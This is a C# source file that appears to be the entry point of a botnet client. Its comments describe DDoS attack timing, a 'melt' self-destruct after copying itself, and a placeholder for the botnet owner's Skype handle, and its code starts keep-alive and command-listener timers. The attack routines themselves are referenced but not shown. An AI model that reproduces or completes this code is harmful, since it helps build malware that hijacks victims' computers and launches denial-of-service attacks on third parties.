using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Drawing.Printing;

using UITimer = System.Threading.Timer;

namespace Reciever
{
    class Program
    {
        //GLOBAL DECLARES
        /////////////////
        //Timer Declares
        static UITimer KeepAliveTimer;
        static UITimer Listener;
        public static UITimer DTimer;
        
        //Global AppPath
        public static string AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        
        //Time holds ddos time in seconds
        public static int Time;
        
        //bool for whether server should melt(selfdestruct after copying)
        static bool Melt = false;
        
        //bool for whether ddos is currently active
        public static bool DActive = false;
        
        //Should hold base64 encrypted skype name of botnet owner
        public static string user = "#SKYPE#";
        /////////////////////
        //END GLOBAL DECLARES

        static void Main()
        {
            StartTimers();
            Console.ReadLine();
        }

        //Starts listener and keep alive timer
        static void StartTimers()
        {
            KeepAliveTimer = new UITimer(Functions.Connection.KeepAlive, 5, 1000, 300000);
            Listener = new UITimer(Functions.Connection.Listen, 5, 1000, 1000);
        }
    }
}